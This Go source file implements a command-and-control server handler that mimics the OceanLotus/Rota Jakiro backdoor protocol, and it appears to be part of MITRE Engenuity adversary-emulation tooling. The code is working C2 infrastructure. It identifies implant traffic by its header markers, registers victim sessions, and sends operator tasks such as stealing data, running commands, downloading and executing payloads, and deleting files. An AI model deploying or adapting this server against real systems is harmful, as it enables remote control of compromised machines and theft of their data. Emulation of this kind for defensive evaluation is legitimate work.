package oceanlotus

/*
OceanLotus - TCP C2 Handler

Characteristics:
- Custom TCP protocol - Head, Key, Payload (type-length-value)
- Encryption: Byte rotation & AES encryption

TCP Key Reporting:
- https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
- https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/
- https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/
- OceanLotus Scripts - https://github.com/eset/malware-research/tree/master/oceanlotus/

Helpful Blogs:
- https://ieftimov.com/posts/understanding-bytes-golang-build-tcp-protocol/#handling-bytes-in-handle-using-the-bytes-package
- https://medium.com/a-bit-off/rebuilding-network-flows-in-gol-d89cfa0884ae
- TCP server i.e. slack - https://github.com/fteem/go-playground/tree/master/slck-protocol


*/

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"unsafe"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/oceanlotus/pkt"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/logger"
	"golang.org/x/exp/slices"
)

// Represents oceanlotus handler. Will impliment util.Handler interface
type oceanlotusHandler struct {
    restAPIaddress       string
    serverAddress        string
    l                    net.Listener //need to refernce for closing the connection cleanly
    commandNumbers       map[string]int
    pendingCommandOutput map[string]map[int]bool
    encryptionEnabled    bool
    pendingUploads       map[string]string
}

// head: magicByte + packetIdentifier + key + keylen + payloadLen
// if payloadLen !=0 -> parse payload fromm [82:payloadLen]

type ImplantPacket struct {
    //header data
    magicByte    []byte
    sessionBytes []byte
    messageCode  []byte
    keyLen       []byte
    payloadLen   []byte // either 0 or count after 82 bytes
    payload      []byte
    //implant information
    UUID      string `json:",omitempty"`
    heartbeat bool   `default:"false"`
    DateExec  string `json:",omitempty"`
    socket    string `json:",omitempty"` //reporting based
    flags     string `json:",omitempty"` //reporting based
    family    string `json:",omitempty"` //reporting based - operating system platform

    data        string `json:",omitempty"` //data sent back from the implant AKA Payload
    key         string `json:",omitempty"` //task output - used to send to another function
    firstPacket bool   `default:"false"`
    protocol    string `json:",omitempty"` //reporting based changes between HTTP or TCP based on how packets are parsed
}

// Info needed from the operator to resructure to send to the implant
type Task struct {
    cmd         string
    lenCmd      int64
    arg         []byte
    lenArgs     int64
    Key         string
    lenKey      int64
    payloadData []byte
    lenPayload  int64
}

// Factory method for creating handler
func oceanlotusHandlerFactory() *oceanlotusHandler {
    return &oceanlotusHandler{
        commandNumbers:       make(map[string]int),
        pendingCommandOutput: make(map[string]map[int]bool),
        pendingUploads:       make(map[string]string),
    }
}

// basic handler functionality
func init() {
    util.AvailableHandlers["oceanlotus"] = oceanlotusHandlerFactory()
}

// Starts the handler
func (o *oceanlotusHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    serverAddress, err := config.GetHostPortString(configEntry)
    if err != nil {
        return err
    }
    o.serverAddress = serverAddress
    logger.Info("Starting the oceanlotus Handler...")

    // Set the restAPI address
    o.restAPIaddress = restAddress

    // Start the TCP listener outside of teh startListener due to unit tests
    o.l, err = net.Listen("tcp", o.serverAddress)
    if err != nil {
        panic(err)
    }
    go o.startListener()

    return nil
}

// Stops the handler and clears any needed data
func (o *oceanlotusHandler) StopHandler() error {
    logger.Info("Killing OceanLotus Server")
    o.l.Close()
    return nil
}

func (o *oceanlotusHandler) startListener() {

    logger.Info("Starting Server...")
    // Listen for incoming connections.
    fmt.Println(o.serverAddress)

    defer o.l.Close()

    for {
        // Listen for an incoming connection
        conn, err := o.l.Accept()
        if err != nil {
            return
        }

        go func(conn net.Conn) {
            buf := make([]byte, 65535)
            length, err := conn.Read(buf)
            if err != nil {
                fmt.Printf("Error reading: %#v\n", err)
                return
            }
            osxUUID := ""
            isHTTP := false

            reader := bytes.NewReader(buf)
            bufReader := bufio.NewReader(reader)
            req, err := http.ReadRequest(bufReader)
            if err != nil {
                logger.Warning(fmt.Sprintf("Could not read HTTP request, potential Rota"))
            } else {
                reqBody, err := ioutil.ReadAll(req.Body)
                if err != nil {
                    logger.Error(fmt.Printf("Could not read HTTP request body: %s", err.Error()))
                } else {
                    isHTTP = true
                    buf = reqBody
                }

                if len(req.Header["Cookie"]) > 0 {
                    cookieMap := strings.SplitN(req.Header["Cookie"][0], "=", 2) //"erp=<UUID>"
                    decodedUUID, err := base64.StdEncoding.DecodeString(cookieMap[1])
                    if err != nil {
                        logger.Error(fmt.Sprintf("Failed to base64 decode UUID from cookie: %s", err.Error()))
                    } else {
                        osxUUID = hex.EncodeToString(decodedUUID)
                    }
                }
            }

            //Is this a lotus packet? If yes, continue. If no, close the connection
            matchLotusResult := false
            if !isHTTP || req.Method == "POST" { //first packet from something
                matchLotusResult = verifyItsALotus(buf[0:82])
            }
            fmt.Println("Buffer received from client:\n", hex.EncodeToString(buf[:130]))

            //transform the stream into a struct and return the ImplantPacket struct
            // test if first packet and assign UUID
            var packet *ImplantPacket
            if isHTTP && req.Method == "GET" {
                packet = new(ImplantPacket)
                packet.heartbeat = true
                packet.UUID = osxUUID
                packet.messageCode = []byte{0x55, 0x00, 0x00, 0x00}
                packet.protocol = "HTTP"
            } else {
                packet, err = o.parseDataStream(buf, length, osxUUID)
                if err != nil {
                    logger.Error(fmt.Sprintf("Failed to parse implant data: %s", err.Error()))
                    return
                }
            }
            
            response, err := o.handleBeacon(packet)
            if err != nil {
                logger.Error(fmt.Sprintf("Failed to handle implant with UUID %s beacon/response: %s", packet.UUID, err.Error()))
                conn.Close()
            }
            // if we generated a response, then this is a lotus packet (OSX logic only)
            if len(response) > 0 {
                matchLotusResult = true
            }
            //print out the packet from the struct - Note values are in decimal
            fmt.Println("Responding to implant with: ", response)

            //after testing populate above code in this if statement (bool)
            //if it's a lotus packet, then print out what the client sent us
            if matchLotusResult {
                conn.Write(response)
            }
            conn.Close()
        }(conn)
    }
}

func (o *oceanlotusHandler) handleBeacon(packet *ImplantPacket) ([]byte, error) {
    var response []byte

    //Handles the session for first packet
    if !o.hasImplantSession(packet.UUID) && packet.firstPacket {
        logger.Info(fmt.Sprintf("Received first-time beacon from %s. Creating session...", packet.UUID))
        err := o.registerNewImplant(packet.UUID)
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to register implant session: %s", err.Error()))
            return nil, err
        }
        logger.Info(fmt.Sprintf("Session created for implant %s", packet.UUID))

        //Dump the initial discovery data if this is the implant's first packet and then return the session ID
        if (packet.protocol == "HTTP" && getInt(packet.payloadLen) > 0) {
            logger.Info(fmt.Sprintf("Initial data received from implant: \n%s", string(packet.payload[25:])))
        }
        // create beacon response
        response, err = o.convertTaskToResponse(packet.UUID, "", packet.protocol)
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to formulate response for implant: %s", packet.UUID))
        }

    } else if !o.hasImplantSession(packet.UUID) && !packet.firstPacket {
        logger.Error(fmt.Sprintf("SKETCH: Received tasking from nonregistered implant %s.", packet.UUID))
    } else {
        logger.Info(fmt.Sprintf("Received beacon from existing implant %s.", packet.UUID))

        if !packet.heartbeat {
            //this is output from a task
            o.handleTaskOutput(packet)
        }

        //Fetch the implant task
        task, err := forwardGetTask(o.restAPIaddress, packet.UUID)
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to fetch implant task: %s", err.Error()))
            return nil, err
        } 
        
        if len(task) == 0 {
            // no qued tasks from operator - send back beacon response
            logger.Info("No tasks available for UUID: ", packet.UUID)
            response, err = o.convertTaskToResponse(packet.UUID, "", packet.protocol)
        } else {
            logger.Info("New task received for UUID: ", packet.UUID)
            
            //Task recieved from Operator - Format the task & return the resonse to send to the implant
            response, err = o.convertTaskToResponse(packet.UUID, task, packet.protocol)
            if err != nil {
                logger.Error(fmt.Sprintf("Failed to convert task to response: %s", err.Error()))
                return nil, err
            }
            logger.Info("Sending new task to implant: " + packet.UUID)
        }
        
    }
    return response, nil
}

// handleTaskOutput logs the implants task response to the server
//
//	ImplantPacket: struct containing the data sent by the implant
func (o *oceanlotusHandler) handleTaskOutput(packet *ImplantPacket) {

    //Check for any pending task outputs
    _, pendingOutput := o.pendingCommandOutput[packet.UUID]
    if !(pendingOutput) {
        logger.Error(fmt.Sprintf("Implant %s does not have any tasks pending output.", packet.UUID))
    }

    if bytes.Equal(packet.messageCode, pkt.Rota_steal_data) || bytes.Equal(packet.messageCode, pkt.OSX_upload_file) {
        // handle upload response from implant
        filepath, ok := o.pendingUploads[packet.UUID]
        if !ok {
            logger.Error(fmt.Sprintf("Implant %s does not have any pending uploads.", packet.UUID))
        }
        restResponse, err := forwardUploadToServer(o.restAPIaddress, filepath, packet.payload)
        if err != nil {
            logger.Error(fmt.Sprintf("Unable to upload file: %s", err.Error()))
        } else if strings.HasPrefix(restResponse, "Successfully uploaded") {
            // implant file successfully uploaded, remove the pending upload
            logger.Success(fmt.Sprintf("File uploaded: %s", restResponse))
            delete(o.pendingUploads, packet.UUID)
        } else {
            // rest api returns error message in the response
            logger.Error(fmt.Sprintf("Unable to upload file: %s", restResponse))
        }

    } else {
        //forward the task output the to rest API
        restResponse, err := forwardTaskOutput(o.restAPIaddress, packet.UUID, packet.payload)
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to process and forward task output: %s", err.Error()))
        }
        logger.Success(string(restResponse))
    }
}

// return an implant data struct
func (o *oceanlotusHandler) parseDataStream(dataStream []byte, length int, osxUUID string) (*ImplantPacket, error) {
    //Parse the Head of the message into variables
    lotus := new(ImplantPacket)
    lotus.magicByte = dataStream[0:4]     //magic bytes
    lotus.sessionBytes = dataStream[4:8]  //if !=0 then it's the Rota session ID
    lotus.payloadLen = dataStream[8:12]   //payload length
    lotus.keyLen = dataStream[12:14]      //key length
    lotus.messageCode = dataStream[14:18] //initial, beacon, or response

    //Check if Rota Jakiro & assign UUID
    sessionBytes := getInt(lotus.sessionBytes)
    if sessionBytes != 0 {
        lotus.UUID = hex.EncodeToString(lotus.sessionBytes)
        lotus.protocol = "TCP"
    }

    //Determine if it's a heartbeat packet
    if bytes.Equal(lotus.messageCode, pkt.Rota_heartbeat) || bytes.Equal(lotus.messageCode, pkt.OSX_heartbeat) {
        fmt.Println("[PKT-ID] Heartbeat pkt identified!")
        lotus.heartbeat = true
    }

    index := 82
    //Is there a key? If yes, parse it. TODO: future encryption
    keySize := getInt(lotus.keyLen)
    if keySize != 0 {
        lotus.key = string(dataStream[index:(index + keySize)])
        index += keySize
    }

    //pull out payload
    i := getInt(lotus.payloadLen)
    if i != 0 && (len(dataStream) >= (i + 82)) {
        // TRANSFORM DATA
        lotus.payload = dataStream[index:(index + i)]
    } else {
        lotus.payload = nil
    }

    //pull OceanLotus UUID
    if lotus.protocol != "TCP" {
        lotus.protocol = "HTTP"
        if osxUUID == "" {
            decodedUUID, err := base64.StdEncoding.DecodeString(string(lotus.payload[:24]))
            if err != nil {
                logger.Error(fmt.Sprintf("Failed to base64 decode UUID from first payload: %s", err.Error()))
            } else {
                lotus.UUID = hex.EncodeToString(decodedUUID)
            }
        } else {
            lotus.UUID = osxUUID
        }
    }

    //check if has session, if not first packet

    if !o.hasImplantSession(lotus.UUID) {
        firstPacketCheck(lotus)
    }

    return lotus, nil
}

/*
Helper functions
getInt(byte array) - convert a byte to an int value
getByte(int, size of desired byte array)convert an int into byte value
*/
func getInt(bytes []byte) int {
    size := len(bytes) - 1
    result := 0
    for i := size; i >= 0; i-- {
        result = result << 8
        result += int(bytes[i])
    }
    return result
}
func getByte(num int64, size int) []byte {
    arr := make([]byte, size)
    for i := 0; i < size; i++ {
        byt := *(*uint8)(unsafe.Pointer(uintptr(unsafe.Pointer(&num)) + uintptr(i)))
        arr[i] = byt
    }
    return arr
}

/*
Checks the following:
- command code - 2170272
- magic byte - 3B91011
If these two codes are present the packet is identified as an initial session
If first packet, a UUID is set if NULL
*/

func firstPacketCheck(p *ImplantPacket) {
    magic := []byte{0x3B, 0x91, 0x01, 0x10}
    firstPacketCmd := []byte{0x21, 0x70, 0x27, 0x20}

    //Set the value for first packet, true or false

    //OSX.OceanLotus.abcdef
    if bytes.Equal(p.magicByte, magic) &&
        bytes.Equal(p.messageCode, firstPacketCmd) &&
        p.protocol == "HTTP" {
        p.firstPacket = true
        p.family = "OSX.OceanLotus.abcdef"
    }

    if bytes.Equal(p.magicByte, magic) &&
        bytes.Equal(p.messageCode, firstPacketCmd) &&
        p.protocol == "TCP" {
        p.firstPacket = true
        p.family = "Rota Jakiro"
    }

}

/*
verifyItsALotus(byte array) returns bool value
* uses if else statement to compare byte array values at specifc index points
* matching sequence is 黑客黑9 (only 3 bits per character, character will take up 5 bits but you can trim the last two bytes off)
* returns a true of false
* CTI: Rota Jakiro & OSX.OceanLotus place constant values at specific indicies throughout the header portion of thier C2 traffic. Based on the consistency of these constants, we use these values at specified indicies as an identifer for C2 traffic. https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/
*/
func verifyItsALotus(header []byte) bool {
    marker1 := []byte{0xC2}
    marker2 := []byte{0xE2}
    marker3 := []byte{0xC2}
    marker4 := []byte{0xFF}
    //fmt.Println(header[19:20], header[24:25], header[29:30], header[75:76])

    if bytes.Equal(marker1, header[19:20]) &&
        bytes.Equal(marker2, header[24:25]) &&
        bytes.Equal(marker3, header[29:30]) &&
        bytes.Equal(marker4, header[75:76]) {
        return true
    }
    return false
}

/*
createResponse()
* payload length, key length, message code - TODO: add key to parameters
* initializies a  struct with default values
* initializies a byte array of 82 bytes
* adds the struct values to the byte array
* adds several constant values at a specified index in the byte array (bytes resemble unicode characters)
*/
func (o *oceanlotusHandler) createResponse(payloadLenInt int64, keyLenInt int64, messageCode []byte, payload []byte) []byte {

    var magicByte = []byte{0x3B, 0x91, 0x01, 0x10}
    payloadLen := getByte(payloadLenInt, 4)
    keyLen := getByte(keyLenInt, 2)
    //allocate byteStream
    byteStream := make([]byte, 82)
    copy(byteStream[0:4], magicByte)     //magic key
    copy(byteStream[8:12], payloadLen)   //payload length
    copy(byteStream[12:14], keyLen)      //key length
    copy(byteStream[14:18], messageCode) //key length
    //add markers
    copy(byteStream[19:], []byte{0xC2}) //marker 1
    copy(byteStream[24:], []byte{0xE2}) //marker 2
    copy(byteStream[29:], []byte{0xC2}) //marker 3
    copy(byteStream[75:], []byte{0xFF}) //marker 4
    fullStream := byteStream

    // TRANSFORM DATA

    if payloadLenInt != 0 {
        fullStream = append(fullStream, payload[:]...)
    }
    return fullStream
}

// ########################## Rest API Task Management Functions ###############################//
// forwardGetTask queries the REST API for tasks for the implant with the specified UUID.
// returns the task as a string and any errors received
func forwardGetTask(restAPIaddress string, uuid string) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/session/" + uuid + "/task"
    response, err := http.Get(url)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    sessionData, err := ioutil.ReadAll(response.Body)
    if err != nil {
        return "", err
    }
    return string(sessionData), err
}

/*
convertTaskToResponse(uuid, string)

Key use cases:
* repsond with beacon (uuid, empty string) - first packet & if there is a check with now tasks queued tasks
* Provide tasking to implant if there is a task in teh queue

Takes the uuid of the implant & tasking string from the operator
Checks if it has a session
creates a task struct
calls extractTaskParts() to populate the struct
uses switch statement to create tasking packet to the implant
returns???
calls:
extractTaskParts()
*/
func (o *oceanlotusHandler) convertTaskToResponse(uuid, taskString string, protocol string) ([]byte, error) {
    stringToInstruction := map[string][]byte {
        "Rota_heartbeat":       pkt.Rota_heartbeat,
        "Rota_exit":            pkt.Rota_exit,
        "Rota_test":            pkt.Rota_test,
        "Rota_query_file":      pkt.Rota_query_file,
        "Rota_delete_file":     pkt.Rota_delete_file,
        "Rota_upload_file":     pkt.Rota_upload_file,
        "Rota_timeout":         pkt.Rota_timeout,
        "Rota_steal_data":      pkt.Rota_steal_data,
        "Rota_upload_dev_info": pkt.Rota_upload_dev_info,
        "Rota_run_plugin":      pkt.Rota_run_plugin,
        "OSX_get_file_size":    pkt.OSX_get_file_size,
        "OSX_exit":             pkt.OSX_exit,
        "OSX_download_exec":    pkt.OSX_download_exec,
        "OSX_run_cmd":          pkt.OSX_run_cmd,
        "OSX_upload_file":      pkt.OSX_upload_file,
        "OSX_download_file":    pkt.OSX_download_file,
        "OSX_config_info":      pkt.OSX_config_info,
        "OSX_heartbeat":        pkt.OSX_heartbeat,
    }

    stringCodes := make([]string, len(stringToInstruction))

    i := 0
    for key, _ := range stringToInstruction {
        stringCodes[i] = key
        i++
    }

    //check for existing session and pending command outputs
    if !o.hasImplantSession(uuid) {
        return nil, errors.New(fmt.Sprintf("No existing session for implant %s.", uuid))
    }
    if _, ok := o.pendingCommandOutput[uuid]; !ok {
        o.pendingCommandOutput[uuid] = make(map[int]bool)
    }

    var task Task
    var err error

    commandNum := -1
    // check the queue for a task from the operator
    if len(taskString) > 0 {

        err = o.extractTaskParts(taskString, &task)
        if err != nil {
            return nil, err
        }
        //grab the task based off the uuid
        commandNum = o.commandNumbers[uuid]
        o.pendingCommandOutput[uuid][commandNum] = true
        o.commandNumbers[uuid] = commandNum + 1
    } else if protocol == "HTTP" {
        task.cmd = "OSX_heartbeat"
        task.lenArgs = 0
        task.lenKey = 0
    } else {
        task.cmd = "Rota_heartbeat"
        task.lenArgs = 0
        task.lenKey = 0
    }

    var response []byte

    // standardize strings for switch statements
    // if contained in the string list (sent from the operator) continue
    // if NOT present, use the map to convert the string([]byte) to expected string cmd
    if !(slices.Contains(stringCodes, task.cmd)) {
        if protocol == "HTTP" {
            response = o.createResponse(0, 0, stringToInstruction["OSX_heartbeat"], []byte{})
        } else {
            response = o.createResponse(0, 0, stringToInstruction["Rota_heartbeat"], []byte{})
        }
        logger.Error("Replacing unknown command with heartbeat:", task.cmd)
    } else {
        //Build the hexData tasking package for the implant
        fmt.Println("Building task for instruction ", task.cmd)

        // download a file: C2 server [file] > implant > victim host
        downloadInstructions := []string {
            "Rota_upload_file",
            "OSX_download_file",
            "OSX_download_exec",
        }

        // upload a file: victim host [file] > implant > C2 server
        uploadInstructions := []string {
            "Rota_steal_data",
            "OSX_upload_file",
        }

        if slices.Contains(downloadInstructions, task.cmd) {
            // replace task.arg with file bytes
            response = o.createResponse(task.lenPayload, task.lenKey, stringToInstruction[task.cmd], task.payloadData)
        } else if slices.Contains(uploadInstructions, task.cmd) {
            // add pending upload for implant
            path := string(task.arg)
            filename := path[strings.LastIndex(path, "/")+1:]
            o.pendingUploads[uuid] = filename
            response = o.createResponse(task.lenArgs, task.lenKey, stringToInstruction[task.cmd], task.arg)
        } else {
            // all other instructions
            response = o.createResponse(task.lenArgs, task.lenKey, stringToInstruction[task.cmd], task.arg)
        }
    }

    return response, nil
}

// Fetches the file from the control server.
// Returns the file bytes or an error if the file could not be retrieved or does not exist.
func forwardGetFileFromServer(restAPIaddress string, fileName string) ([]byte, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/files/oceanlotus/" + fileName
    resp, err := http.Get(url)
    var filedata []byte
    if err != nil {
        return filedata, err
    }
    if resp.StatusCode != 200 {
        return filedata, errors.New("server did not return requested file: " + fileName)
    }
    filedata, err = ioutil.ReadAll(resp.Body)
    if err != nil {
        return filedata, err
    }
    return filedata, nil
}

// forwardUploadToServer forwards a file upload to the REST API server.
// Args:
//
//	restAPIaddress: the address of the C2 server's REST API
//	fileName: name of file to upload to the server
//	data: the contents of the file to upload to the server
//
// Returns REST API server response and any errors received
func forwardUploadToServer(restAPIaddress string, fileName string, data []byte) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/upload/" + fileName
    resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(data))
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()
    return util.ExtractRestApiStringResponsedData(resp)
}

// Forward task output to REST API server
func forwardTaskOutput(restAPIaddress string, uuid string, data []byte) ([]byte, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/session/" + uuid + "/task/output"

    // initialize HTTP request
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
    if err != nil {
        return nil, err
    }
    req.Header.Set("Content-Type", "application/json")

    // execute HTTP POST request and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        return nil, err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return nil, err
    }

    // Extract Response
    apiResponse, err := util.ExtractRestApiStringResponsedData(response)
    if err != nil {
        return nil, err
    }

    return []byte(apiResponse), err
}

/*
extractTaskParts(string from server, task struct pointer)
parses the string pulled from the server (operator) using unmarshal() (json serialized)
populates the tast struct with information from the operator
returns Errors
*/
func (o *oceanlotusHandler) extractTaskParts(taskString string, task *Task) error {
    trimmedTask := strings.TrimSpace(taskString)
    var taskData map[string]interface{}
    err := json.Unmarshal([]byte(trimmedTask), &taskData)
    if err != nil {
        return err
    }

    // Extract the command ID
    if cmdIDVal, ok := taskData["cmd"]; ok {
        parsedCmdID, castOk := cmdIDVal.(string)
        if !castOk {
            return errors.New(fmt.Sprintf("Bad command: %v", cmdIDVal))
        }
        task.cmd = parsedCmdID
    } else {
        return errors.New("Command not provided in task string")
    }

    //pull payload from server
    payloadNameStr, ok := taskData["payload"]
    if !ok {
        payloadNameStr = ""
    }
    payloadName := strings.TrimSpace(payloadNameStr.(string))
    if len(payloadName) > 0 {
        logger.Info("Fetching requested file for task: ", payloadName)
        task.payloadData, err = forwardGetFileFromServer(o.restAPIaddress, payloadName)
        if err != nil {
            return err
        }
    } else {
        task.payloadData = []byte{}
    }
    task.lenPayload = int64(len(task.payloadData))

    //tasks we want from the command server to send to the client = mapping for implants to parse
    //file commands - expects a file path
    //exec commands - expects a string to run

    //Extract arg - file paths or sleep time (seconds)
    if commandStr, ok := taskData["arg"]; ok {
        task.arg = []byte(strings.TrimSpace(commandStr.(string)))
        task.lenArgs = int64(len(task.arg))
    }

    return nil
}

//########################## Session Managment Funcitons ###############################//
/*
Functions called (nested as well):
*createNewSessionDataBytes(uuid, computerName, user, pid)
*forwardRegisterImplant(s.restAPIaddress, implantData)
*storeImplantSession(uuid)
*hasImplantSession(uuid)
*/
func (o *oceanlotusHandler) registerNewImplant(uuid string) error {
    implantData := createNewSessionDataBytes(uuid)
    restResponse, err := forwardRegisterImplant(o.restAPIaddress, implantData)
    if err != nil {
        return err
    }
    if err = o.storeImplantSession(uuid); err != nil {
        return err
    }
    logger.Info(restResponse)

    logger.Success(fmt.Sprintf("Successfully created session for implant %s.", uuid))
    return nil
}

func createNewSessionDataBytes(uuid string) []byte {
    jsonStr, err := json.Marshal(map[string]interface{}{"guid": uuid})
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to create JSON info for session for UUID %s: %s", uuid, err.Error()))
        return nil
    }
    return []byte(jsonStr)
}
func forwardRegisterImplant(restAPIaddress string, implantData []byte) (string, error) {
    url := "http://" + restAPIaddress + "/api/v1.0/session"

    // initialize HTTP request
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
    if err != nil {
        return "", err
    }
    req.Header.Set("Content-Type", "application/json")

    // execute HTTP POST request and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", err
    }
    return util.ExtractRestApiStringResponsedData(response)
}
func (o *oceanlotusHandler) storeImplantSession(uuid string) error {
    if o.hasImplantSession(uuid) {
        return errors.New(fmt.Sprintf("Session %s already exists.", uuid))
    }
    o.commandNumbers[uuid] = 1
    o.pendingCommandOutput[uuid] = make(map[int]bool)
    return nil
}
func (o *oceanlotusHandler) hasImplantSession(uuid string) bool {
    _, ok := o.commandNumbers[uuid]
    return ok

}
